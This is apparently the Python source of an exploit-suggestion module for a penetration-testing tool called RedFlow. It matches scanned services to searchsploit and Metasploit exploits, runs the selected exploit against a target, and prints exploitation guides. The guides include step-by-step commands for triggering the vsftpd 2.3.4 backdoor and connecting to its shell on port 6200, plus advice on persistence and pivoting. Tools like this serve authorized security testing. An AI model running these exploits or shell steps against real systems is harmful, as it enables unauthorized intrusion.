#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Exploit Suggester for RedFlow
Advanced exploit recommendation engine
"""

import os
import sys
import logging
from typing import Dict, List, Any, Optional, Tuple
import json

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from redflow.utils.config import Config
from redflow.modules.gpt.exploit_advisor import ExploitAdvisor, ExploitInfo
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.markdown import Markdown

class ExploitSuggester:
    """
    Main interface for suggesting exploits for vulnerabilities
    """
    
    def __init__(self, config: Config, logger: logging.Logger):
        """
        Initialize the exploit suggester
        
        Args:
            config: RedFlow configuration
            logger: Logger instance
        """
        self.config = config
        self.logger = logger
        self.console = Console()
        self.advisor = ExploitAdvisor(config, logger, self.console)
        
        # Check if we need to filter by a specific port
        self.specific_port = os.environ.get("REDFLOW_SPECIFIC_PORT", None)
        if self.specific_port:
            self.logger.info(f"Exploit suggester will filter by port {self.specific_port}")
            
    def suggest_exploits(self, target_info: Dict[str, Any]) -> Dict[str, List[Dict[str, Any]]]:
        """
        Suggest exploits for the target based on open ports and service information
        
        Args:
            target_info: Dictionary containing target information with open ports
            
        Returns:
            Dictionary of suggested exploits per service
        """
        self.logger.info("Starting exploit suggestion process")
        
        # Check if target_info is valid
        if not target_info or 'ports' not in target_info or not target_info['ports']:
            self.logger.warning("No ports found in target information")
            return {}
            
        # Extract target details
        target_ip = target_info.get('ip', 'Unknown')
        target_domain = target_info.get('domain', '')
        
        # If target_ip is still 'Unknown', check environment variable
        if target_ip == 'Unknown':
            target_ip = os.environ.get("REDFLOW_TARGET", "127.0.0.1")
            self.logger.info(f"Using target IP from environment: {target_ip}")
        
        self.console.print(f"\n[bold cyan]== RedFlow Exploit Advisor ==[/bold cyan]")
        self.console.print(f"Target: [bold]{target_ip}[/bold] {f'({target_domain})' if target_domain else ''}")
        
        # If specific port is set, filter to only show that port
        if self.specific_port and self.specific_port in target_info['ports']:
            self.console.print(f"[bold cyan]Focusing on port {self.specific_port} as requested[/bold cyan]")
            filtered_ports = {self.specific_port: target_info['ports'][self.specific_port]}
            target_info['ports'] = filtered_ports
        
        # Dictionary to store results
        suggested_exploits = {}
        
        # Track which exploits we've already displayed to avoid repetition
        already_shown_exploits = set()
        
        # Process each port
        for port_num, port_info in target_info['ports'].items():
            # Skip ports that are not open
            if port_info.get('state', '').lower() != 'open':
                continue
                
            service_name = port_info.get('service', '').lower()
            version = port_info.get('version', '')
            
            if not service_name:
                continue
            
            # Normalize service name and version for better matching
            # Special case for vsftpd which often appears as "ftp"
            normalized_service = service_name
            normalized_version = version
            
            # Check for common service naming patterns in version string
            if "vsftpd" in version.lower():
                normalized_service = "vsftpd"
                # Extract version number from string like "vsftpd 2.3.4"
                import re
                vsftpd_match = re.search(r'vsftpd\s+(\d+\.\d+\.\d+)', version.lower())
                if vsftpd_match:
                    normalized_version = vsftpd_match.group(1)
                self.logger.info(f"Detected vsftpd from version string: {normalized_service} {normalized_version}")
                
            self.logger.info(f"Looking for exploits for {service_name} {version} on port {port_num}")
            
            # Get exploits for service with exact version match first, using normalized values
            exploits = self.advisor.find_exploits_for_service(normalized_service, normalized_version)
            
            # If using original values got no results, try the original values
            if not exploits and (normalized_service != service_name or normalized_version != version):
                exploits = self.advisor.find_exploits_for_service(service_name, version)
            
            # Filter out exploits we've already shown
            unique_exploits = []
            for exploit in exploits:
                exploit_id = exploit.path
                if exploit_id not in already_shown_exploits:
                    unique_exploits.append(exploit)
                    already_shown_exploits.add(exploit_id)
            
            # If we have fewer than 3 unique exploits and version contains spaces or special chars,
            # try with just the first part of the version (more general)
            if len(unique_exploits) < 3 and version and self.config.exploitation.get("use_full_search", True):
                # Try with just the major version
                if ' ' in version or '-' in version or '/' in version:
                    # Extract just numbers at the beginning of the version string
                    import re
                    version_match = re.match(r'^(\d+(\.\d+)?)', version)
                    simplified_version = version_match.group(1) if version_match else ""
                    
                    if simplified_version:
                        self.logger.info(f"Searching for exploits with simplified version: {service_name} {simplified_version}")
                        broad_exploits = self.advisor.find_exploits_for_service(service_name, simplified_version)
                        
                        # Add more unique exploits
                        for exploit in broad_exploits:
                            exploit_id = exploit.path
                            if exploit_id not in already_shown_exploits:
                                unique_exploits.append(exploit)
                                already_shown_exploits.add(exploit_id)
                                if len(unique_exploits) >= 10:
                                    break
            
            if unique_exploits:
                self.logger.info(f"Found {len(unique_exploits)} potential exploits for {service_name}")
                
                # Set up a table to display exploits
                table = Table(title=f"Potential Exploits for {service_name} {version} on port {port_num}")
                table.add_column("#", style="white", justify="right")
                table.add_column("Exploit Name", style="cyan")
                table.add_column("Path", style="green")
                table.add_column("CVE", style="yellow")
                table.add_column("Analysis", style="magenta")
                
                # Store exploits for this service
                service_exploits = []
                
                # Maximum number of exploits to analyze with GPT
                max_gpt_analysis = 3 if self.config.use_gpt else 0
                analyzed_count = 0
                
                for i, exploit in enumerate(unique_exploits[:10], 1):  # Limit to top 10 exploits
                    # Convert exploit to dictionary for output
                    exploit_dict = exploit.to_dict()
                    
                    # Get GPT analysis for top exploits if use_gpt is enabled
                    gpt_analysis = None
                    if self.config.use_gpt and analyzed_count < max_gpt_analysis:
                        self.logger.info(f"Analyzing exploit {exploit.title} with GPT")
                        gpt_analysis = self.advisor.analyze_exploit_with_gpt(
                            exploit, service_name, version
                        )
                        analyzed_count += 1
                        
                    exploit_dict["gpt_analysis"] = gpt_analysis
                    service_exploits.append(exploit_dict)
                    
                    # Add to table
                    assessment = "GPT Analysis Available" if gpt_analysis else "Not Analyzed"
                    table.add_row(
                        str(i),
                        exploit.title,
                        os.path.basename(exploit.path),
                        exploit.cve or "Unknown",
                        assessment
                    )
                
                # Store results
                suggested_exploits[f"{service_name}:{port_num}"] = service_exploits
                
                # Display table
                self.console.print(table)
                
                # Offer to run or analyze an exploit immediately
                self.console.print("\n[bold cyan]Would you like to analyze or run one of these exploits? (y/n)[/bold cyan]")
                run_exploit = input("> ").strip().lower().startswith("y")
                
                if run_exploit:
                    # Ask which exploit to run
                    self.console.print("[bold cyan]Enter the number of the exploit you want to work with:[/bold cyan]")
                    exploit_num = input("> ").strip()
                    
                    try:
                        exploit_idx = int(exploit_num) - 1
                        if 0 <= exploit_idx < len(service_exploits):
                            selected_exploit = service_exploits[exploit_idx]
                            
                            # Show detailed GPT analysis if available
                            if selected_exploit.get("gpt_analysis"):
                                self.console.print(
                                    Panel(
                                        Markdown(selected_exploit["gpt_analysis"]),
                                        title=f"GPT Analysis: {selected_exploit['title']}",
                                        border_style="blue"
                                    )
                                )
                                
                            # Ask what to do with this exploit
                            self.console.print("\n[bold cyan]What would you like to do?[/bold cyan]")
                            self.console.print("[1] View exploit code")
                            self.console.print("[2] Run with Metasploit (if applicable)")
                            self.console.print("[3] Manual exploitation guidance")
                            self.console.print("[4] Return to main menu")
                            action = input("> ").strip()
                            
                            if action == "1":
                                # View exploit code
                                self._view_exploit_code(selected_exploit)
                            elif action == "2":
                                # Try to run with metasploit
                                self._run_exploit_with_metasploit(selected_exploit, target_ip, port_num)
                            elif action == "3":
                                # Provide manual guidance
                                self._provide_manual_guidance(selected_exploit, service_name, version, target_ip, port_num)
                        else:
                            self.console.print("[bold red]Invalid selection.[/bold red]")
                    except ValueError:
                        self.console.print("[bold red]Invalid selection.[/bold red]")
            else:
                self.console.print(f"No exploits found for {service_name} {version}")
                
        return suggested_exploits
    
    def _view_exploit_code(self, exploit: Dict[str, Any]) -> None:
        """
        Display the code of an exploit file
        
        Args:
            exploit: Exploit information dictionary
        """
        self.logger.info(f"Displaying exploit code for {exploit.get('path', 'Unknown')}")
        
        if not exploit.get('path'):
            self.console.print(f"[bold red]Exploit path not found[/bold red]")
            return
            
        try:
            with open(exploit.get('path'), 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                
            self.console.print(Panel(content, title=f"Exploit Code: {os.path.basename(exploit.get('path', 'Unknown'))}", border_style="green"))
        except Exception as e:
            self.logger.error(f"Error reading exploit file: {e}")
            self.console.print(f"[bold red]Error reading exploit file: {e}[/bold red]")
    
    def _run_exploit_with_metasploit(self, exploit: Dict[str, Any], target_ip: str, port: str) -> None:
        """
        Run an exploit with Metasploit
        
        Args:
            exploit: Exploit information dictionary
            target_ip: Target IP address
            port: Target port
        """
        self.logger.info(f"Running exploit {exploit.get('title', 'Unknown exploit')} with Metasploit")
        
        # Check if this is a Python file from searchsploit
        exploit_path = exploit.get('path', '')
        if exploit_path.endswith('.py') and not exploit.get('metasploit_path'):
            self.logger.info(f"Detected Python exploit from searchsploit: {exploit_path}")
            self.console.print(f"[bold yellow]This appears to be a Python script from searchsploit, not a Metasploit module.[/bold yellow]")
            self.console.print(f"[bold cyan]Would you like to run it directly? (y/n)[/bold cyan]")
            run_directly = input("> ").strip().lower().startswith("y")
            
            if run_directly:
                self._run_searchsploit_python(exploit, target_ip, port)
            return
            
        # Regular Metasploit handling
        if not exploit.get('metasploit_path'):
            self.console.print(f"[bold red]Metasploit path not found for {exploit.get('title', 'Unknown exploit')}[/bold red]")
            return
            
        try:
            resource_file = self.advisor.generate_metasploit_resource(
                exploit.get('metasploit_path'),
                target_ip,
                int(port)
            )
            if resource_file:
                self.advisor.run_metasploit_resource(resource_file)
        except Exception as e:
            self.logger.error(f"Error running exploit with Metasploit: {e}")
            self.console.print(f"[bold red]Error running exploit with Metasploit: {e}[/bold red]")
    
    def _run_searchsploit_python(self, exploit: Dict[str, Any], target_ip: str, port: str) -> None:
        """
        Run a Python exploit from searchsploit directly
        
        Args:
            exploit: Exploit information dictionary
            target_ip: Target IP address
            port: Target port
        """
        exploit_path = exploit.get('path', '')
        
        if not os.path.exists(exploit_path):
            self.console.print(f"[bold red]Exploit file not found: {exploit_path}[/bold red]")
            
            # Check if the exploit exists in the local directory (user may have downloaded it)
            local_name = os.path.basename(exploit_path)
            if os.path.exists(local_name):
                exploit_path = local_name
                self.console.print(f"[bold green]Found exploit in current directory: {local_name}[/bold green]")
            else:
                # Suggest downloading the exploit
                self.console.print("[bold yellow]You need to download the exploit first.[/bold yellow]")
                self.console.print(f"[bold yellow]Run: searchsploit -m {os.path.basename(exploit_path)}[/bold yellow]")
                return
        
        # Make sure the file is executable
        self.console.print(f"[bold cyan]Making the exploit executable...[/bold cyan]")
        import subprocess
        try:
            subprocess.run(["chmod", "+x", exploit_path], check=True)
            self.console.print("[bold green]Successfully made the exploit executable[/bold green]")
        except Exception as e:
            self.console.print(f"[bold yellow]Warning: Could not make the exploit executable: {e}[/bold yellow]")
            
        # Run the exploit
        self.console.print(f"[bold cyan]Running the exploit against {target_ip}:{port}...[/bold cyan]")
        try:
            # Try common argument patterns for Python exploits
            cmd_options = [
                # Simple target IP only
                [exploit_path, target_ip],
                # Target IP and port
                [exploit_path, target_ip, port],
                # With -t for target
                [exploit_path, "-t", target_ip, "-p", port],
                # With --target and --port
                [exploit_path, "--target", target_ip, "--port", port],
                # With RHOST and RPORT (Metasploit-style)
                [exploit_path, "RHOST=" + target_ip, "RPORT=" + port]
            ]
            
            # Check if we need to view help first
            self.console.print("[bold cyan]Would you like to see the exploit's help first? (y/n)[/bold cyan]")
            show_help = input("> ").strip().lower().startswith("y")
            
            if show_help:
                # Try to get help
                help_options = ["-h", "--help", "help"]
                for help_opt in help_options:
                    try:
                        self.console.print(f"[bold cyan]Trying {help_opt} option...[/bold cyan]")
                        result = subprocess.run([exploit_path, help_opt], capture_output=True, text=True)
                        if result.stdout:
                            self.console.print(f"[bold green]Help output:[/bold green]\n{result.stdout}")
                            break
                    except Exception:
                        continue
                
                # Ask for custom command
                self.console.print("[bold cyan]Enter custom command to run the exploit (or leave empty to try default options):[/bold cyan]")
                custom_cmd = input("> ").strip()
                
                if custom_cmd:
                    # Parse the custom command and run it
                    import shlex
                    cmd_args = shlex.split(custom_cmd)
                    subprocess.run(cmd_args)
                    return
            
            # Try each option until one works
            for cmd in cmd_options:
                try:
                    self.console.print(f"[bold cyan]Trying command: {' '.join(cmd)}[/bold cyan]")
                    subprocess.run(cmd)
                    self.console.print("[bold green]Exploit execution completed[/bold green]")
                    break
                except Exception as e:
                    self.console.print(f"[bold yellow]Command failed: {e}[/bold yellow]")
                    # Ask if we should continue with the next option
                    if cmd != cmd_options[-1]:  # Not the last option
                        self.console.print("[bold cyan]Try next option? (y/n)[/bold cyan]")
                        try_next = input("> ").strip().lower().startswith("y")
                        if not try_next:
                            break
        
        except Exception as e:
            self.logger.error(f"Error running Python exploit: {e}")
            self.console.print(f"[bold red]Error running Python exploit: {e}[/bold red]")
    
    def _provide_manual_guidance(self, exploit: Dict[str, Any], service_name: str, version: str, target_ip: str, port: str) -> None:
        """
        Provide manual exploitation guidance
        
        Args:
            exploit: Exploit information dictionary
            service_name: Service name
            version: Service version
            target_ip: Target IP address
            port: Target port
        """
        self.logger.info(f"Showing manual guidance for {exploit.get('title', 'Unknown exploit')}")
        
        # Special case for vsftpd 2.3.4 backdoor (CVE-2011-2523)
        if "vsftpd 2.3.4" in exploit.get('title', '').lower() and "backdoor" in exploit.get('title', '').lower():
            self.logger.info("Providing specific guidance for vsftpd 2.3.4 backdoor")
            
            # Check if this is a searchsploit Python exploit
            is_searchsploit_py = exploit.get('path', '').endswith('.py') and not exploit.get('metasploit_path')
            exploit_filename = os.path.basename(exploit.get('path', ''))
            
            guidance = f"""
# vsftpd 2.3.4 Backdoor Exploitation Guide

## Background
The vsftpd 2.3.4 contains a backdoor that was inserted into the original distribution. When a username is sent that contains
the characters `:)` (a smiley face), a backdoor shell is opened on port 6200.

## Target Information
- IP Address: {target_ip}
- FTP Port: {port}
- Service: vsftpd 2.3.4
- Exploit Found: {exploit.get('title', 'Unknown')}
- Exploit Source: {"SearchSploit" if is_searchsploit_py else "Metasploit Framework"}

## Exploitation Methods

### Method 1: Manual Exploitation
```bash
# Step 1: Connect to the FTP server and trigger the backdoor
ftp {target_ip} {port}
# When prompted for username, enter: "backdoor:)"
# When prompted for password, enter anything

# Step 2: The FTP connection will hang, press Ctrl+C to cancel

# Step 3: Connect to the backdoor shell on port 6200
nc {target_ip} 6200
```

"""

            # If this is a searchsploit Python exploit, add specific instructions
            if is_searchsploit_py:
                guidance += f"""
### Method 2: Using the SearchSploit Python Script
```bash
# Step 1: Download the exploit if you haven't already
searchsploit -m {exploit_filename}

# Step 2: Make it executable
chmod +x {exploit_filename}

# Step 3: Run the exploit
./{exploit_filename} {target_ip}
```

**NOTE**: If the script fails with parameter errors, try these alternatives:
```bash
# Alternative with target flag
./{exploit_filename} -t {target_ip}

# Alternative with explicit port
./{exploit_filename} {target_ip} {port}

# Alternative with target and port flags
./{exploit_filename} --target {target_ip} --port {port}
```

**Troubleshooting**: If you get a Python error, you may need to modify the first line of the script to match your Python path or run with explicit Python:
```bash
python3 {exploit_filename} {target_ip}
```
"""
            
            # Add metasploit instructions
            guidance += f"""
### Method 3: Using Metasploit Framework
```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS {target_ip}
set RPORT {port}
exploit
```

## Post-Exploitation
Once you have shell access:
1. Check your privileges with `id` or `whoami`
2. Explore the system, look for sensitive files
3. Consider establishing persistence or pivoting to other systems

## Notes
- The backdoor listens on port 6200 for a short time only
- If connection fails, try triggering the backdoor again
- This vulnerability only affects vsftpd version 2.3.4 specifically
- Always ensure you have proper authorization before testing exploits
"""
            
            self.console.print(Panel(Markdown(guidance), title="vsftpd 2.3.4 Backdoor Exploitation Guide", border_style="red", expand=False))
            return
        
        # Create guidance based on file extension for other exploits
        file_ext = exploit.get("file_ext", "").lower()
        file_name = os.path.basename(exploit.get("path", ""))
        
        guidance = f"""
# Manual Exploitation Guide for {exploit.get('title', 'Unknown exploit')}

## Target Information
- IP Address: {target_ip}
- Port: {port}
- Service: {service_name}

## Exploitation Steps

### 1. Navigate to the exploit location
```bash
cd {os.path.dirname(exploit.get('path', ''))}
```

"""
        
        # Add specific guidance based on file type
        if file_ext == ".py":
            guidance += f"""
### 2. Run the Python exploit
```bash
python3 {file_name} --target {target_ip} --port {port}
# or
python3 {file_name} -t {target_ip} -p {port}
```

### 3. Check for additional required parameters
```bash
python3 {file_name} --help
```
"""
        elif file_ext == ".rb" and exploit.get("metasploit_path"):
            guidance += f"""
### 2. Run with Metasploit
```bash
msfconsole -q
use {exploit.get('metasploit_path')}
set RHOSTS {target_ip}
set RPORT {port}
show options
# Fill in any required options
exploit
```
"""
        elif file_ext in [".c", ".cpp"]:
            guidance += f"""
### 2. Compile and run the exploit
```bash
gcc -o exploit {file_name}
./exploit {target_ip} {port}
```
"""
        else:
            guidance += f"""
### 2. Review the exploit file to determine how to run it
```bash
cat {file_name}
```

### 3. Execute the exploit according to its requirements
The exact command depends on the exploit type. Check the header comments for usage instructions.
"""
        
        self.console.print(Panel(Markdown(guidance), title="Manual Exploitation Guide", border_style="cyan", expand=False))

if __name__ == "__main__":
    # Simple test code
    from redflow.utils.logger import get_logger
    
    config = Config()
    logger = get_logger("exploit_suggester", log_level=logging.INFO)
    
    suggester = ExploitSuggester(config, logger)
    
    # Test target info
    test_target = {
        "ip": "192.168.1.100",
        "domain": "example.com",
        "ports": {
            "21": {
                "service": "ftp",
                "version": "vsftpd 2.3.4",
                "state": "open"
            },
            "80": {
                "service": "http",
                "version": "Apache httpd 2.4.49",
                "state": "open"
            }
        }
    }
    
    # Run test
    suggester.suggest_exploits(test_target) 